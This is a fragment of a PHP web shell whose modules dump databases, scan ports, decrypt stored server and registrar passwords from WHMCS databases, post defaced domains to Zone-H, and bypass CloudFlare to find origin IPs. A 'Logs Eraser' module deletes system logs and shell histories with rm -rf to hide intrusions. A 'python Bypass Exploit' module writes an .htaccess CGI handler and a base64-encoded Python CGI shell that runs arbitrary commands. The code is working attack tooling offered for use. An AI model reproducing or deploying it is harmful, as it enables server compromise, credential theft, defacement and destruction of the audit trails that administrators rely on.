<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="' . $me . '">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
    if ($_POST['username'] && $_POST['dbname'] && $_POST['method']) {
        $date = date('Y-m-d');
        $dbserver = $_POST['server'];
        $dbuser = $_POST['username'];
        $dbpass = $_POST['password'];
        $dbname = $_POST['dbname'];
        $file = "Dump-$dbname-$date";
        $method = $_POST['method'];
        if ('sql' == $method) {
            $file = "Dump-$dbname-$date.sql";
            $fp = fopen($file, 'w');
        } else {
            $file = "Dump-$dbname-$date.sql.gz";
            $fp = gzopen($file, 'w');
        }
        function write($data)
        {
            global $fp;
            if ('ssql' == $_POST['method']) {
                fwrite($fp, $data);
            } else {
                gzwrite($fp, $data);
            }
        }
        mysql_connect($dbserver, $dbuser, $dbpass);
        mysql_select_db($dbname);
        $tables = mysql_query('SHOW TABLES');
        while ($i = mysql_fetch_array($tables)) {
            $i = $i['Tables_in_' . $dbname];
            $create = mysql_fetch_array(mysql_query('SHOW CREATE TABLE ' . $i));
            write($create['Create Table'] . ';

');
            $sql = mysql_query('SELECT * FROM ' . $i);
            if (mysql_num_rows($sql)) {
                while ($row = mysql_fetch_row($sql)) {
                    foreach ($row as $j => $k) {
                        $row[$j] = "'" . mysql_escape_string($k) . "'";
                    }
                    write("INSERT INTO $i VALUES(" . implode(',', $row) . ');
');
                }
            }
        }
        if ('ssql' == $method) {
            fclose($fp);
        } else {
            gzclose($fp);
        }
        header('Content-Disposition: attachment; filename=' . $file);
        header('Content-Type: application/download');
        header('Content-Length: ' . filesize($file));
        flush();
        $fp = fopen($file, 'r');
        while (!feof($fp)) {
            echo fread($fp, 65536);
            flush();
        }
        fclose($fp);
    }
}
/////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('port-sc' == $_GET['x'])) {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=port-sc" method="post">
    <?php
    echo '<br><br><center><br><b>+--=[ Port Scanner ]=--+</b><br>';
    $start = strip_tags($_POST['start']);
    $end = strip_tags($_POST['end']);
    $host = strip_tags($_POST['host']);
    if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
        for ($i = $start; $i <= $end; ++$i) {
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if ($fp) {
                echo 'Port ' . $i . ' is <font color=green>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#428bca;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#428bca;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#428bca;" name="end" value="5000"/></td>
   </tr><td><input class="inputzbut" type="submit" style="color:#428bca" value="Scan Ports" />
   </td></form></center></table>';
    }
}
/////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('hash' == $_GET['x'])) {
    $submit = $_POST['enter'];
    if (isset($submit)) {
        $pass = $_POST['password']; // password
        $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
        $hash = md5($pass); // md5 hash #1
        $md4 = hash('md4', $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
        $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
        $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash('sha256', $text);
        $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
        $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
    }
    echo '<form action="" method="post"><b><table class=tabnet>';
    echo '<tr><th colspan="2">Password Hash</th></center></tr>';
    echo '<tr><td><b>masukan kata yang ingin di encrypt:</b></td>';
    echo '<td><input class="inputz" type="text" name="password" size="40" />';
    echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
    echo '</td></tr><br>';
    echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
    echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value=' . $pass . '></td></tr><br><br>';
    echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value=' . $hash . '></td></tr><br><br>';
    echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value=' . $md4 . '></td></tr><br><br>';
    echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash_md5 . '></td></tr><br><br>';
    echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value=' . $hash_md5_double . '></td></tr><br><br>';
    echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value=' . $hash1 . '></td></tr><br><br>';
    echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value=' . $sha256 . '></td></tr><br><br>';
    echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1 . '></td></tr><br><br>';
    echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value=' . $hash1_sha1_double . '></td></tr><br><br></table>';
}
/////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('whmcs' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=whmcs" method="post">

<?php
    function decrypt($string, $cc_encryption_hash)
    {
        $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
        $hash_key = _hash($key);
        $hash_length = strlen($hash_key);
        $string = base64_decode($string);
        $tmp_iv = substr($string, 0, $hash_length);
        $string = substr($string, $hash_length, strlen($string) - $hash_length);
        $iv = $out = '';
        $c = 0;
        while ($c < $hash_length) {
            $iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
            ++$c;
        }
        $key = $iv;
        $c = 0;
        while ($c < strlen($string)) {
            if ((0 != $c and 0 == $c % $hash_length)) {
                $key = _hash($key . substr($out, $c - $hash_length, $hash_length));
            }
            $out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
            ++$c;
        }

        return $out;
    }
    function _hash($string)
    {
        if (function_exists('sha1')) {
            $hash = sha1($string);
        } else {
            $hash = md5($string);
        }
        $out = '';
        $c = 0;
        while ($c < strlen($hash)) {
            $out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
            $c += 2;
        }

        return $out;
    }
    echo "
<br><center><font size='5' color='#428bca'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr> 
<tr><td><input type='text' style='color:#428bca;background-color:' class='inputz' size='38' name='db_host' value='' placeholder='db_host'></td></tr>
<tr><td><input type='text' style='color:#428bca;background-color:' class='inputz' size='38' name='db_username' value='' placeholder='db_username'></td></tr>
<tr><td><input type='text' style='color:#428bca;background-color:' class='inputz' size='38' name='db_password' value='' placeholder='db_password'></td></tr>
<tr><td><input type='text' style='color:#428bca;background-color:' class='inputz' size='38' name='db_name' value='' placeholder='db_name'></td></tr>
<tr><td><input style='color:#428bca;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value='' placeholder='cc_encryption_hash'></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#428bca;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";
    if (2 == $_POST['form_action']) {
        //include($file);
        $db_host = ($_POST['db_host']);
        $db_username = ($_POST['db_username']);
        $db_password = ($_POST['db_password']);
        $db_name = ($_POST['db_name']);
        $cc_encryption_hash = ($_POST['cc_encryption_hash']);
        $link = mysql_connect($db_host, $db_username, $db_password);
        mysql_select_db($db_name, $link);
        $query = mysql_query('SELECT * FROM tblservers');
        while ($v = mysql_fetch_array($query)) {
            $ipaddress = $v['ipaddress'];
            $username = $v['username'];
            $type = $v['type'];
            $active = $v['active'];
            $hostname = $v['hostname'];
            echo "<center><table border='1'>";
            $password = decrypt($v['password'], $cc_encryption_hash);
            echo "<tr><td>Type</td><td>$type</td></tr>";
            echo "<tr><td>Active</td><td>$active</td></tr>";
            echo "<tr><td>Hostname</td><td>$hostname</td></tr>";
            echo "<tr><td>Ip</td><td>$ipaddress</td></tr>";
            echo "<tr><td>Username</td><td>$username</td></tr>";
            echo "<tr><td>Password</td><td>$password</td></tr>";
            echo '</table><br><br></center>';
        }
        $link = mysql_connect($db_host, $db_username, $db_password);
        mysql_select_db($db_name, $link);
        $query = mysql_query('SELECT * FROM tblregistrars');
        echo "<center>Domain Reseller <br><table class=tabnet border='1'>";
        echo '<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>';
        while ($v = mysql_fetch_array($query)) {
            $registrar = $v['registrar'];
            $setting = $v['setting'];
            $value = decrypt($v['value'], $cc_encryption_hash);
            if ('' == $value) {
                $value = 0;
            }
            $password = decrypt($v['password'], $cc_encryption_hash);
            echo "<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>";
        }
    }
} elseif (isset($_GET['x']) && ('zone' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=zone" method="post">

<br><br><center>
<!-- Zone-H -->
<form action="" method='POST'><table><table class='tabnet'><tr>
<td style='background-color:#0000;padding-left:10px;'><tr><tr><th colspan="2"><h2>Zone-H Defacer</h2></th></tr></td></tr><tr><td height='45' colspan='2'><form method="post">
<input type="text" class="inputz" name="defacer" value="Nama Defacer" />
<select name="hackmode" class="inputz" >
<option >------------------------Method------------------------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access c#428bcaentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason" class="inputz" >
<option >-------------Reason---------------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
<input type="hidden" name="action" value="zone">
<center><textarea style="background:black;outline:none;" name="domain" cols="116" rows="9" id="domains">List Of Domains</textarea>
<br /><input class='inputzbut' type="submit" value="Send Now !" name="SendNowToZoneH" /><br></center></table>
</form></td></tr></table></form>
<!-- End Of Zone-H -->
</td></center><br><br>

<?php
    echo '<center>';
    if (isset($_POST['SendNowToZoneH'])) {
        $hacker = $_POST['defacer'];
        $method = $_POST['hackmode'];
        $neden = $_POST['reason'];
        $site = $_POST['domain'];
        if (empty($hacker)) {
            die('<center><font  size=3>[-] You Must Fill the Attacker name !</font></center>');
        } elseif ('--------SELECT--------' == $method) {
            die('<center><font  size=3>[-] You Must Select The Method !</center>');
        } elseif ('--------SELECT--------' == $neden) {
            die('<center><font  size=3>[-] You Must Select The Reason</center>');
        } elseif (empty($site)) {
            die('<center><font  size=3>[-] You Must Inter the Sites List !</center>');
        }
        // Zone-h Poster
        function ZoneH($url, $hacker, $hackmode, $reson, $site)
        {
            $k = curl_init();
            curl_setopt($k, CURLOPT_URL, $url);
            curl_setopt($k, CURLOPT_POST, true);
            curl_setopt($k, CURLOPT_POSTFIELDS, 'defacer=' . $hacker . '&domain1=' . $site . '&hackmode=' . $hackmode . '&reason=' . $reson);
            curl_setopt($k, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
            $kubra = curl_exec($k);
            curl_close($k);

            return $kubra;
        }
        $i = 0;
        $sites = explode('
', $site);
        echo "<pre class=ml1 style='margin-top:5px'>";
        while ($i < count($sites)) {
            if ('http' != substr($sites[$i], 0, 4)) {
                $sites[$i] = 'http://' . $sites[$i];
            }
            ZoneH('http://zone-h.org/notify/single', $hacker, $method, $neden, $sites[$i]);
            echo '<font class=txt size=3>Site : ' . $sites[$i] . ' Posted !</font><br>';
            ++$i;
        }
        echo '<font class=txt size=4>Sending Sites To Zone-H Has Been Completed Successfully !! </font></pre>';
        echo '</center>';
    }
}
/////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('deltlogss' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=deltlogss" method="post">

<?php
    echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Logs Eraser</span><center><br>';
    //exec function madafuck !
    echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";
    exec('rm -rf /tmp/logs');
    exec('rm -rf /root/.ksh_history');
    exec('rm -rf /root/.bash_history');
    exec('rm -rf /root/.bash_logout');
    exec('rm -rf /usr/local/apache/logs');
    exec('rm -rf /usr/local/apache/log');
    exec('rm -rf /var/apache/logs');
    exec('rm -rf /var/apache/log');
    exec('rm -rf /var/run/utmp');
    exec('rm -rf /var/logs');
    exec('rm -rf /var/log');
    exec('rm -rf /var/adm');
    exec('rm -rf /etc/wtmp');
    exec('rm -rf /etc/utmp');
    exec("rm -rf $HISTFILE");
    exec('rm -rf /var/log/lastlog');
    exec('rm -rf /var/log/wtmp');
    //shell_exec function madafuck !
    shell_exec('rm -rf /tmp/logs');
    shell_exec('rm -rf /root/.ksh_history');
    shell_exec('rm -rf /root/.bash_history');
    shell_exec('rm -rf /root/.bash_logout');
    shell_exec('rm -rf /usr/local/apache/logs');
    shell_exec('rm -rf /usr/local/apache/log');
    shell_exec('rm -rf /var/apache/logs');
    shell_exec('rm -rf /var/apache/log');
    shell_exec('rm -rf /var/run/utmp');
    shell_exec('rm -rf /var/logs');
    shell_exec('rm -rf /var/log');
    shell_exec('rm -rf /var/adm');
    shell_exec('rm -rf /etc/wtmp');
    shell_exec('rm -rf /etc/utmp');
    shell_exec("rm -rf $HISTFILE");
    shell_exec('rm -rf /var/log/lastlog');
    shell_exec('rm -rf /var/log/wtmp');
    //passthru function madafuck !
    passthru('rm -rf /tmp/logs');
    passthru('rm -rf /root/.ksh_history');
    passthru('rm -rf /root/.bash_history');
    passthru('rm -rf /root/.bash_logout');
    passthru('rm -rf /usr/local/apache/logs');
    passthru('rm -rf /usr/local/apache/log');
    passthru('rm -rf /var/apache/logs');
    passthru('rm -rf /var/apache/log');
    passthru('rm -rf /var/run/utmp');
    passthru('rm -rf /var/logs');
    passthru('rm -rf /var/log');
    passthru('rm -rf /var/adm');
    passthru('rm -rf /etc/wtmp');
    passthru('rm -rf /etc/utmp');
    passthru("rm -rf $HISTFILE");
    passthru('rm -rf /var/log/lastlog');
    passthru('rm -rf /var/log/wtmp');
    //Let the Mother of Functions To Complete The Task wkwkwkw xD!
    system('rm -rf /tmp/logs');
    sleep(2);
    echo '<br><font color="009900" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Deleted [+].../tmp/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif>';
    sleep(2);
    system('rm -rf /root/.bash_history');
    sleep(2);
    echo '<p>Deleted [+].../root/.bash_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /root/.ksh_history');
    sleep(2);
    echo '<p>Deleted [+].../root/.ksh_history <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /root/.bash_logout');
    sleep(2);
    echo '<p>Deleted [+].../root/.bash_logout <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /usr/local/apache/logs');
    sleep(2);
    echo '<p>Deleted [+].../usr/local/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /usr/local/apache/log');
    sleep(2);
    echo '<p>Deleted [+].../usr/local/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/apache/logs');
    sleep(2);
    echo '<p>Deleted [+].../var/apache/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/apache/log');
    sleep(2);
    echo '<p>Deleted [+].../var/apache/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/run/utmp');
    sleep(2);
    echo '<p>Deleted [+].../var/run/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/logs');
    sleep(2);
    echo '<p>Deleted [+].../var/logs <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/log');
    sleep(2);
    echo '<p>Deleted [+].../var/log <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/adm');
    sleep(2);
    echo '<p>Deleted [+].../var/adm <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /etc/wtmp');
    sleep(2);
    echo '<p>Deleted [+].../etc/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /etc/utmp');
    sleep(2);
    echo '<p>Deleted [+].../etc/utmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system("rm -rf $HISTFILE");
    sleep(2);
    echo '<p>Deleted [+]...$HISTFILE <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/log/lastlog');
    sleep(2);
    echo '<p>Deleted [+].../var/log/lastlog <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    system('rm -rf /var/log/wtmp');
    sleep(2);
    echo '<p>Deleted [+].../var/log/wtmp <img src=http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif></p>';
    sleep(4);
    echo '</font><br><br><p><font color="00bb00" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Your Traces Has Been Successfully Erased From the Server';
    echo '</td></tr></table>';
}
/////////////////////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('bypass-cf' == $_GET['x'])) {
    echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass
<font color="#CC0000">CloudFlare</font> ]=--+</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';
    $target = $_POST['target'];
    // Bypass From FTP
    if ('ftp' == $_POST['krz']) {
        $ftp = gethostbyname('ftp.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#428bca'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
    }
    // Bypass From Direct-Connect
    if ('direct-conntect' == $_POST['krz']) {
        $direct = gethostbyname('direct-connect.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#428bca'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
    }
    // Bypass From Webmail
    if ('webmail' == $_POST['krz']) {
        $web = gethostbyname('webmail.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#428bca'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
    }
    // Bypass From Cpanel
    if ('cpanel' == $_POST['krz']) {
        $cpanel = gethostbyname('cpanel.' . "$target");
        echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#428bca'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
    }
}
//////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('hashid' == $_GET['x'])) {
    if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (32 == strlen($hash)) {
            $hashresult = 'MD5 Hash';
        } elseif (40 == strlen($hash)) {
            $hashresult = 'SHA-1 Hash/ /MySQL5 Hash';
        } elseif (13 == strlen($hash)) {
            $hashresult = 'DES(Unix) Hash';
        } elseif (16 == strlen($hash)) {
            $hashresult = 'MySQL Hash / /DES(Oracle Hash)';
        } elseif (41 == strlen($hash)) {
            $GetHashChar = substr($hash, 40);
            if ('*' == $GetHashChar) {
                $hashresult = 'MySQL5 Hash';
            }
        } elseif (64 == strlen($hash)) {
            $hashresult = 'SHA-256 Hash';
        } elseif (96 == strlen($hash)) {
            $hashresult = 'SHA-384 Hash';
        } elseif (128 == strlen($hash)) {
            $hashresult = 'SHA-512 Hash';
        } elseif (34 == strlen($hash)) {
            if (strstr($hash, '$1$')) {
                $hashresult = 'MD5(Unix) Hash';
            }
        } elseif (37 == strlen($hash)) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = 'MD5(APR) Hash';
            }
        } elseif (34 == strlen($hash)) {
            if (strstr($hash, '$H$')) {
                $hashresult = 'MD5(phpBB3) Hash';
            }
        } elseif (34 == strlen($hash)) {
            if (strstr($hash, '$P$')) {
                $hashresult = 'MD5(Wordpress) Hash';
            }
        } elseif (39 == strlen($hash)) {
            if (strstr($hash, '$5$')) {
                $hashresult = 'SHA-256(Unix) Hash';
            }
        } elseif (39 == strlen($hash)) {
            if (strstr($hash, '$6$')) {
                $hashresult = 'SHA-512(Unix) Hash';
            }
        } elseif (24 == strlen($hash)) {
            if (strstr($hash, '==')) {
                $hashresult = 'MD5(Base-64) Hash';
            }
        } else {
            $hashresult = 'Hash type not found';
        }
    } else {
        $hashresult = 'Not Hash Ente#428bca';
    } ?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<tr>
		<table class="tabnet">
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
	
	<?php
}
//////////////////////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('python' == $_GET['x'])) {
    echo '<center/><br/><b>
 +--==[ python  Bypass Exploit ]==--+ 
 </b><br><br>';
    mkdir('python', 0755);
    chdir('python');
    $kokdosya = '.htaccess';
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die('Dosya a&#231;&#305;lamad&#305;!');
    $metin = 'AddHandler cgi-script .izo';
    fwrite($dosya, $metin);
    fclose($dosya);
    $pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
